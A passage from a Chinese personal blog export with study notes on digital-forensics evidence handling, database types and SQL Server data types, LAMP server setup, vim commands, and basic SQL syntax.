<h3 id="在现场获取电子证据的指导原则"><a href="#在现场获取电子证据的指导原则" class="headerlink" title="在现场获取电子证据的指导原则"></a>在现场获取电子证据的指导原则</h3><ul>
<li>准备获取数字证据</li>
<li>处理事故或犯罪现场</li>
</ul>
<p>授权人才可以进入现场</p>
<p>对电脑或数码设备周围的区域进行录像和静态记录</p>
<p>速写事件和犯罪现场</p>
<p>检查设备状态，确保易失数据不丢失</p>
<ol>
<li>如果可能，指派一个人收集并记录所有证据。尽量减少·处理证据的人数，以确保其完整性。</li>
<li>标记你收集的所有证据，包括当前的日期时间、序列号或独特特征、品牌和型号，以及收集者的姓名。</li>
<li>维护收集的证据的两个单独日志，以核对审计控制目的，并验证你收集的一切。</li>
<li>持续控制收集到的证据和犯罪或事故现场。</li>
</ol>
<h4 id="使用RAID系统处理数据中心"><a href="#使用RAID系统处理数据中心" class="headerlink" title="使用RAID系统处理数据中心"></a>使用RAID系统处理数据中心</h4><h4 id="使用技术顾问"><a href="#使用技术顾问" class="headerlink" title="使用技术顾问"></a>使用技术顾问</h4><h4 id="在实验室记录证据"><a href="#在实验室记录证据" class="headerlink" title="在实验室记录证据"></a>在实验室记录证据</h4><h4 id="处理数字证据"><a href="#处理数字证据" class="headerlink" title="处理数字证据"></a>处理数字证据</h4><ol>
<li>复制文件到大驱动器</li>
<li>启动取证工具访问并打开镜像文件</li>
<li>对镜像进行哈希运算</li>
<li>复制镜像到一个更大的驱动器</li>
</ol>
<h3 id="存储电子数据的程序"><a href="#存储电子数据的程序" class="headerlink" title="存储电子数据的程序"></a>存储电子数据的程序</h3><h4 id="记录的证据"><a href="#记录的证据" class="headerlink" title="记录的证据"></a>记录的证据</h4><ul>
<li>识别证据</li>
<li>确定谁处理了证据</li>
<li>列出处理证据的日期和时间</li>
</ul>
<h3 id="如何获取数字散列"><a href="#如何获取数字散列" class="headerlink" title="如何获取数字散列"></a>如何获取数字散列</h3><h4 id="法庭哈希法的三条规则"><a href="#法庭哈希法的三条规则" class="headerlink" title="法庭哈希法的三条规则"></a>法庭哈希法的三条规则</h4><ol>
<li>无法预测文件或设备的哈希值</li>
<li>没有两个哈希值可以是相同的（注意，使用超级计算机的研究中也曾发生过碰撞）</li>
<li>如果文件或设备发生了任何变化，哈希值必须改变</li>
</ol>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>取证</tag>
        <tag>读书打卡</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库</title>
    <url>/2020/02/28/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<p>简单总结数据的学习</p>
<h3 id="数据库分类"><a href="#数据库分类" class="headerlink" title="数据库分类"></a>数据库分类</h3><h4 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h4><p>由二维表及其之间的联系组成的一个数据组织。</p>
<p>MySQL、MariaDB（MySQL的代替品）、Percona Server（MySQL的代替品）、PostgreSQL、Microsoft Access、Microsoft SQL Server（上课使用的）、Google Fusion Tables、FileMaker、Oracle数据库、Sybase、dBASE、Clipper、FoxPro、foshub、IBM DB2。</p>
<p>常见的MySQL主要用于服务器，快速简单可靠，并且完全开源免费。自己的搜题网站的题目就是放在mysql中。</p>
<p>sql server 微软开发的数据库管理系统，只能在Windows上运行，感觉偏重于对数据的储存和管理，作为一种工具使用，而不是一种服务。</p>
<p>Microsoft Access 微软开发的小型数据库，其实excel储存管理数据我觉得也可。</p>
<p>IBM DB2 大型数据库、企业级。</p>
<h4 id="非关系数据库"><a href="#非关系数据库" class="headerlink" title="非关系数据库"></a>非关系数据库</h4><p>非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。</p>
<p>BigTable（Google）、Cassandra、MongoDB、CouchDB。</p>
<h4 id="键值数据库"><a href="#键值数据库" class="headerlink" title="键值数据库"></a>键值数据库</h4><p>通过外键关联来建立表与表之间的关系，非关系型数据库通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。</p>
<p>Apache Cassandra（Facebook）、Dynamo、LevelDB（Google）。</p>
<h3 id="安装SQL-Server-2008"><a href="#安装SQL-Server-2008" class="headerlink" title="安装SQL Server 2008"></a>安装SQL Server 2008</h3><p>Emmmmmmm没啥特别的，就是安装呗。</p>
<p>虚拟机中安装。</p>
<h3 id="简单使用-SQL-Server-2008"><a href="#简单使用-SQL-Server-2008" class="headerlink" title="简单使用 SQL Server 2008"></a>简单使用 SQL Server 2008</h3><p>可视化操作</p>
<h4 id="打开并链接"><a href="#打开并链接" class="headerlink" title="打开并链接"></a>打开并链接</h4><p>开始-&gt;所有程序-&gt;Microsoft SQL Server 2008-&gt;SQL Server Management Studio-&gt;链接</p>
<p>注意连接的时候两种链接认证方式，一种是Windows管理权限即root，另一种混合式即再设置一个账号密码</p>
<p>创建数据库-&gt;创建表-&gt;设置列名和其属性（设计）-&gt;ctrl+s然后保存并设置表明-&gt;编辑前200行填入数据-&gt;新建查询，SQL语句进行查询</p>
<p><img src="https://ech0zr.github.io/img/post/sql/sql1.jpg"></p>
<p><img src="https://ech0zr.github.io/img/post/sql/sql2.jpg"></p>
<h4 id="SQL-Server-数据类型："><a href="#SQL-Server-数据类型：" class="headerlink" title="SQL Server 数据类型："></a>SQL Server 数据类型：</h4><ul>
<li>character 字符串：</li>
</ul>
<p>char(n):固定长度的字符串。最多 8,000 个字符。</p>
<p>varchar(n):可变长度的字符串。最多 8,000 个字符。</p>
<p>varchar(max):可变长度的字符串。最多 1,073,741,824 个字符。</p>
<p>text:可变长度的字符串。最多 2GB 字符数据。</p>
<ul>
<li>Unicode 字符串：</li>
</ul>
<p>nchar(n):固定长度的 Unicode 数据。最多 4,000 个字符。</p>
<p>nvarchar(n):可变长度的 Unicode 数据。最多 4,000 个字符。</p>
<p>nvarchar(max):可变长度的 Unicode 数据。最多 536,870,912 个字符。</p>
<p>ntext:可变长度的 Unicode 数据。最多 2GB 字符数据。</p>
<ul>
<li>Binary 类型：</li>
</ul>
<p>bit:允许 0、1 或 NULL</p>
<p>binary(n):固定长度的二进制数据。最多 8,000 字节。</p>
<p>varbinary(n):可变长度的二进制数据。最多 8,000 字节。</p>
<p>varbinary(max):    可变长度的二进制数据。最多 2GB 字节。</p>
<p>image:    可变长度的二进制数据。最多 2GB。</p>
<ul>
<li>Number 类型：</li>
</ul>
<p>tinyint:允许从 0 到 255 的所有数字。</p>
<p>smallint:允许从 -32,768 到 32,767 的所有数字。</p>
<p>int:允许从 -2,147,483,648 到 2,147,483,647 的所有数字。</p>
<p>bigint:允许介于 -9,223,372,036,854,775,808 和 9,223,372,036,854,775,807 之间的所有数字。</p>
<p>decimal(p,s):固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0</p>
<p>numeric(p,s):固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</p>
<p>smallmoney:介于 -214,748.3648 和 214,748.3647 之间的货币数据。</p>
<p>money:介于 -922,337,203,685,477.5808 和 922,337,203,685,477.5807 之间的货币数据。</p>
<p>float(n):从 -1.79E + 308 到 1.79E + 308 的浮动精度数字数据。 参数 n 指示该字段保存 4 字节还是 8 字节。float(24) 保存 4 字节，而 float(53) 保存 8 字节。n 的默认值是 53。</p>
<p>real:从 -3.40E + 38 到 3.40E + 38 的浮动精度数字数据。</p>
<ul>
<li>Data 类型：</li>
</ul>
<p>datetime:从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 3.33 毫秒。</p>
<p>datetime2:从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 100 纳秒。</p>
<p>smalldatetime:从 1900 年 1 月 1 日 到 2079 年 6 月 6 日，精度为 1 分钟。</p>
<p>date:仅存储日期。从 0001 年 1 月 1 日 到 9999 年 12 月 31 日。</p>
<p>time:仅存储时间。精度为 100 纳秒。</p>
<p>datetimeoffset:与 datetime2 相同，外加时区偏移。</p>
<p>timestamp:存储唯一的数字，每当创建或修改某行时，该数字会更新。timestamp 基于内部时钟，不对应真实时间。每个表只能有一个 timestamp 变量。</p>
<ul>
<li>其他数据类型：</li>
</ul>
<p>sql_variant:存储最多 8,000 字节不同数据类型的数据，除了 text、ntext 以及 timestamp。</p>
<p>uniqueidentifier:存储全局标识符 (GUID)。</p>
<p>xml:存储 XML 格式化数据。最多 2GB。</p>
<p>cursor:存储对用于数据库操作的指针的引用。</p>
<p>table:存储结果集，供稍后处理。</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>考试</tag>
      </tags>
  </entry>
  <entry>
    <title>新领取的服务器搭建环境</title>
    <url>/2020/02/07/%E6%96%B0%E9%A2%86%E5%8F%96%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<p>阿里云免费领了半年的服务器，lamp环境搭建了n次，这里总结一下基本操作。</p>
<h2 id="安装apache2"><a href="#安装apache2" class="headerlink" title="安装apache2"></a>安装apache2</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install apache2 -y</span><br></pre></td></tr></table></figure>

<h2 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install mysql-server -y</span><br></pre></td></tr></table></figure>

<h4 id="mysql安全配置"><a href="#mysql安全配置" class="headerlink" title="mysql安全配置"></a>mysql安全配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>

<p>是否安装验证密码插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">VALIDATE PASSWORD PLUGIN can be used to test passwords</span><br><span class="line">and improve security. It checks the strength of password</span><br><span class="line">and allows the users to set only those passwords which are</span><br><span class="line">secure enough. Would you like to setup VALIDATE PASSWORD plugin?</span><br><span class="line">    </span><br><span class="line">Press y|Y for Yes, any other key for No: N</span><br></pre></td></tr></table></figure>

<p>怕麻烦选择N，另外只要密码安全就没啥。</p>
<p>设置新密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">New password: </span><br><span class="line">Re-enter new password:</span><br></pre></td></tr></table></figure>

<p>是否删除匿名用户 Y</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">By default, a MySQL installation has an anonymous user,</span><br><span class="line">allowing anyone to log into MySQL without having to have</span><br><span class="line">a user account created for them. This is intended only for</span><br><span class="line">testing, and to make the installation go a bit smoother.</span><br><span class="line">You should remove them before moving into a production</span><br><span class="line">environment.</span><br><span class="line">    </span><br><span class="line">Remove anonymous users? (Press y|Y for Yes, any other key for No) : Y</span><br></pre></td></tr></table></figure>

<p>是否禁用远程root登陆 Y</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Normally, root should only be allowed to connect from</span><br><span class="line">&#x27;localhost&#x27;. This ensures that someone cannot guess at</span><br><span class="line">the root password from the network.</span><br><span class="line">    </span><br><span class="line">Disallow root login remotely? (Press y|Y for Yes, any other key for No) : Y</span><br></pre></td></tr></table></figure>

<p>删除测试数据库并访问它 Y</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">By default, MySQL comes with a database named &#x27;test&#x27; that</span><br><span class="line">anyone can access. This is also intended only for testing,</span><br><span class="line">and should be removed before moving into a production</span><br><span class="line">environment.</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Remove test database and access to it? (Press y|Y for Yes, any other key for No) : Y</span><br></pre></td></tr></table></figure>

<p>重新加载权限表 Y</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Reloading the privilege tables will ensure that all changes</span><br><span class="line">made so far will take effect immediately.</span><br><span class="line">    </span><br><span class="line">Reload privilege tables now? (Press y|Y for Yes, any other key for No) : Y</span><br><span class="line"></span><br><span class="line">OK！</span><br></pre></td></tr></table></figure>

<h2 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install php -y</span><br></pre></td></tr></table></figure>

<h4 id="修改首先访问php文件"><a href="#修改首先访问php文件" class="headerlink" title="修改首先访问php文件"></a>修改首先访问php文件</h4><p>打开/etc/apache2/mods-enabled/dir.conf文件并将其更改为首先列出index.php。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_dir.c&gt;</span><br><span class="line">        DirectoryIndex index.php index.html index.cgi index.pl index.xhtml index.htm</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>重启Apache</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart apache2</span><br></pre></td></tr></table></figure>
<p>文件放在/var/www/html</p>
<h4 id="安装php模块"><a href="#安装php模块" class="headerlink" title="安装php模块"></a>安装php模块</h4><p>例如安装curl</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install php-curl</span><br></pre></td></tr></table></figure>

<p>在查找所需的模块时遇到问题，只需输入apt install php-（模块的第一个字母），然后点击TAB键。Ubuntu将显示所有匹配的包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> apt install php-c</span></span><br><span class="line">php-cache-integration-tests  php-cgi                      php-common                  php-console-table</span><br><span class="line">php-cache-lite              php-cli                      php-composer-ca-bundle      php-constant-time</span><br><span class="line">php-cache-tag-interop        php-cli-prompt              php-composer-semver          php-curl</span><br><span class="line">php-cas                      php-codecoverage            php-composer-spdx-licenses   </span><br><span class="line">php-cassandra                php-codesniffer              php-console-commandline</span><br></pre></td></tr></table></figure>

<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 start    //启动Apache服务</span><br><span class="line"></span><br><span class="line">/etc/init.d/apache2 stop    //停止Apache服务</span><br><span class="line"></span><br><span class="line">/etc/init.d/apache2 restart    //重启Apache服务 </span><br></pre></td></tr></table></figure>

<p>也可以使用</p>
<pre><code class="Shell">systemctl restart apache2
</code></pre>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>linxu</tag>
        <tag>服务器</tag>
        <tag>搭建lamp</tag>
      </tags>
  </entry>
  <entry>
    <title>vim基本命令</title>
    <url>/2020/02/07/vim%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<p>vim的三个模式：命令模式，输入模式，底线命令模式。</p>
<h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p>刚进入vim便是处在命令模式。此时键盘动作被vim识别为命令而非字符串。</p>
<h3 id="常用的命令："><a href="#常用的命令：" class="headerlink" title="常用的命令："></a>常用的命令：</h3><ul>
<li>i 切换到输入模式</li>
<li>x 删除当前光标所在的字符</li>
<li>：切换到底线命令模式</li>
</ul>
<h3 id="进阶命令："><a href="#进阶命令：" class="headerlink" title="进阶命令："></a>进阶命令：</h3><h4 id="控制光标及屏幕显示"><a href="#控制光标及屏幕显示" class="headerlink" title="控制光标及屏幕显示"></a>控制光标及屏幕显示</h4><ul>
<li>hjkl 相当方向键左下上右</li>
<li>ctrl+f 屏幕向下移动一页，相当Page Down</li>
<li>ctrl+b 屏幕向上移动一页，相当Page Up</li>
<li>ctrl+d 屏幕向下移动半页</li>
<li>ctrl+u 屏幕向上移动半页</li>
<li><ul>
<li>光标移动到非空格符的下一行</li>
</ul>
</li>
<li><ul>
<li>光标移动到非空格符的上一行</li>
</ul>
</li>
<li>n空格 按下数字再按空格键，光标会向右移动这一行的n个字符</li>
<li>0或者home 移动到这一行的最前面字符处</li>
<li>$或者End 移动到这一行最后面字符处</li>
</ul>
<h4 id="搜索与替换："><a href="#搜索与替换：" class="headerlink" title="搜索与替换："></a>搜索与替换：</h4><ul>
<li>/word 向光标之下寻找一个名称为 word 的字符串。例如要在档案内搜寻vbird这个字符串，就输入 /vbird</li>
<li>?word 向光标之上寻找一个字符串名称为word的字符串。</li>
<li>n 英文键n，继续查找下一个对象</li>
<li>:n1,n2s/word1/word2/g n1与n2为数字。在第n1与n2行之间寻找word1这个字符串，并将该字符串取代为word2！举例来说，在100到200行之间搜寻vbird并取代为VBIRD则：“:100,200s/vbird/VBIRD/g”。</li>
<li>:1,$s/word1/word2/g或:%s/word1/word2/g 从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！</li>
<li>:1,$s/word1/word2/gc或:%s/word1/word2/gc 从第一行到最后一行寻找word1字符串，并将该字符串取代为word2！且在取代前显示提示字符给用户确认(confirm)是否需要取代！</li>
</ul>
<h4 id="删除、复制、粘贴"><a href="#删除、复制、粘贴" class="headerlink" title="删除、复制、粘贴"></a>删除、复制、粘贴</h4><ul>
<li>x,X 在一行字当中，x为向后删除一个字符(相当于del键)，X为向前删除一个字符(相当于backspace键) </li>
<li>dd 删除游标所在的那一整行</li>
<li>ndd n为数字。删除光标所在的向下n行</li>
<li>yy 复制游标所在的那一行</li>
<li>nyy n为数字。复制光标所在的向下n行</li>
<li>p,P     p为将已复制的数据在光标下一行贴上，P则为贴在游标上一行！ 举例来说，我目前光标在第20行且已经复制了 10 行数据。则按下p后，那10行数据会贴在原本的20行之后，亦即由21行开始贴。但如果是按下P呢？那么原本的第20行会被推到变成30行。</li>
<li>u 复原前一个动作</li>
<li>ctrl+r 重做上一个动作</li>
</ul>
<h2 id="输入模式："><a href="#输入模式：" class="headerlink" title="输入模式："></a>输入模式：</h2><ul>
<li>字符按键以及Shift组合，输入字符</li>
<li>ENTER，回车键，换行</li>
<li>BACK SPACE，退格键，删除光标前一个字符</li>
<li>DEL，删除键，删除光标后一个字符</li>
<li>方向键，在文本中移动光标</li>
<li>HOME/END，移动光标到行首/行尾</li>
<li>Page Up/Page Down，上/下翻页</li>
<li>Insert，切换光标为输入/替换模式，光标将变成竖线/下划线</li>
<li>ESC，退出输入模式，切换到命令模式</li>
</ul>
<h2 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h2><ul>
<li>：q 退出程序</li>
<li>：q！强制退出（文件修改了但不想保存）</li>
<li>：w 保存文件</li>
<li>：w [filename] 另存为</li>
<li>：wq 保存并退出</li>
<li>ESC 退出输入模式切换到命令模式</li>
</ul>
<p>附神图一张：<br><img src="https://ech0zr.github.io/img/post/vim1.jpg" alt="vim"></p>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的SQL语法学习</title>
    <url>/2020/03/06/%E7%AE%80%E5%8D%95%E7%9A%84SQL%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<p>知识学了不用很快就忘了。这里再简单总结一下sql语法的基础。</p>
<p>SQL不区分大小写，每一句不一定要有分号结尾。（具体要看数据库系统的要求）</p>
<p>SQL语法可分为两部分：DML（数据操作语言）和DDL（数据定义语言）</p>
<p>常见DML：</p>
<p>SELECT ——从数据库表中获取数据</p>
<p>UPDATE ——更新数据库表中的数据</p>
<p>DELETE ——从数据库表中删除数据</p>
<p>INSERT INTO ——向数据库表中插入数据</p>
<p>常见DDL：</p>
<p>CREATE DATABASE —— 创建新数据库</p>
<p>ALTER DATABASE ——修改数据库</p>
<p>CREATE TABLE —— 创建新表</p>
<p>ALTER TABLE ——变更（改变）数据库表</p>
<p>DROP TABLE ——删除表</p>
<p>CREATE INDEX ——创建索引（搜索键）</p>
<p>DROP INDEX ——删除索引</p>
<h3 id="SELECT语句"><a href="#SELECT语句" class="headerlink" title="SELECT语句"></a>SELECT语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名称</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> list1,list2 <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>

<h3 id="SELECT-DISTINCT语句"><a href="#SELECT-DISTINCT语句" class="headerlink" title="SELECT DISTINCT语句"></a>SELECT DISTINCT语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 列名称 <span class="keyword">FROM</span> 表名称</span><br></pre></td></tr></table></figure>

<p>关键词DISTINCT用于返回唯一的值。（用来排除重复值）</p>
<h3 id="WHERE-子句"><a href="#WHERE-子句" class="headerlink" title="WHERE 子句"></a>WHERE 子句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">WHERE</span> 列 运算符 值</span><br></pre></td></tr></table></figure>

<p>有条件的从表中选取数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons <span class="keyword">WHERE</span> City<span class="operator">=</span><span class="string">&#x27;Beijing&#x27;</span></span><br></pre></td></tr></table></figure>

<p> SQL 使用单引号来环绕<em>文本值</em>（大部分数据库系统也接受双引号）。如果是<em>数值</em>，请不要使用引号。 </p>
<h3 id="AND-amp-OR运算符"><a href="#AND-amp-OR运算符" class="headerlink" title="AND&amp;OR运算符"></a>AND&amp;OR运算符</h3><p>把多个条件结合起来</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons <span class="keyword">WHERE</span> FirstName<span class="operator">=</span><span class="string">&#x27;Thomas&#x27;</span> <span class="keyword">AND</span> LastName<span class="operator">=</span><span class="string">&#x27;Carter&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons <span class="keyword">WHERE</span> (FirstName<span class="operator">=</span><span class="string">&#x27;Thomas&#x27;</span> <span class="keyword">OR</span> FirstName<span class="operator">=</span><span class="string">&#x27;William&#x27;</span>)</span><br><span class="line"><span class="keyword">AND</span> LastName<span class="operator">=</span><span class="string">&#x27;Carter&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="ORDER-BY子句"><a href="#ORDER-BY子句" class="headerlink" title="ORDER BY子句"></a>ORDER BY子句</h3><p>用于对结果集进行排序</p>
<p>实例1：以字母顺序显示公司名称</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company</span><br></pre></td></tr></table></figure>

<p>实例2： 以字母顺序显示公司名称（Company），并以数字顺序显示顺序号（OrderNumber） </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company, OrderNumber</span><br></pre></td></tr></table></figure>

<p>实例3： 以逆字母顺序显示公司名称 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>

<p>实例4： 以逆字母顺序显示公司名称，并以数字顺序显示顺序号 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company <span class="keyword">DESC</span>, OrderNumber <span class="keyword">ASC</span></span><br></pre></td></tr></table></figure>

<h3 id="INSERT-INTO语句"><a href="#INSERT-INTO语句" class="headerlink" title="INSERT INTO语句"></a>INSERT INTO语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名称 <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....) #每一列的值</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (列<span class="number">1</span>, 列<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)  #在指定列中插入数据</span><br></pre></td></tr></table></figure>

<p>用于向表格中插入新的行</p>
<h3 id="Update语句"><a href="#Update语句" class="headerlink" title="Update语句"></a>Update语句</h3><p>用于修改表中的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE 表名称 <span class="keyword">SET</span> 列名称 <span class="operator">=</span> 新值 <span class="keyword">WHERE</span> 列名称 <span class="operator">=</span> 某值</span><br></pre></td></tr></table></figure>

<p>更新某一行中的若干列例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE Person <span class="keyword">SET</span> Address <span class="operator">=</span> <span class="string">&#x27;Zhongshan 23&#x27;</span>, City <span class="operator">=</span> <span class="string">&#x27;Nanjing&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> LastName <span class="operator">=</span> <span class="string">&#x27;Wilson&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="DELETE语句"><a href="#DELETE语句" class="headerlink" title="DELETE语句"></a>DELETE语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名称 <span class="keyword">WHERE</span> 列名称 <span class="operator">=</span> 值</span><br></pre></td></tr></table></figure>

<p>用于删除表中的行</p>
<p>删除某行例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> Person <span class="keyword">WHERE</span> LastName <span class="operator">=</span> <span class="string">&#x27;Wilson&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>删除所有行例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name</span><br></pre></td></tr></table></figure>

<p>在不删除表的情况下删除所有的行，表的结构、属性、索引不变。</p>
<h3 id="TOP子句"><a href="#TOP子句" class="headerlink" title="TOP子句"></a>TOP子句</h3><p>用于规定要返回的记录的数目</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP number<span class="operator">|</span><span class="keyword">percent</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br></pre></td></tr></table></figure>

<p>在MySQL中可以用LIMIT代替</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">LIMIT number</span><br></pre></td></tr></table></figure>

<p>在Oracle语句中可以用ROWNUM</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> ROWNUM <span class="operator">&lt;=</span> number</span><br></pre></td></tr></table></figure>

<p>可通过百分比选取，列子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">50</span> <span class="keyword">PERCENT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br></pre></td></tr></table></figure>

<h3 id="LIKE操作符"><a href="#LIKE操作符" class="headerlink" title="LIKE操作符"></a>LIKE操作符</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="keyword">pattern</span></span><br></pre></td></tr></table></figure>

<p>相当一种模糊匹配</p>
<h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><table>
<thead>
<tr>
<th>通配符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>%</td>
<td>替代一个或多个字符</td>
</tr>
<tr>
<td>_</td>
<td>仅替代一个字符</td>
</tr>
<tr>
<td>[charlist]</td>
<td>字符列中的任何单一字符</td>
</tr>
<tr>
<td>[^charlist]或[!charlist]</td>
<td>不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<p>例子： 从 “Persons” 表中选取居住在包含 “lond” 的城市里的人 </p>
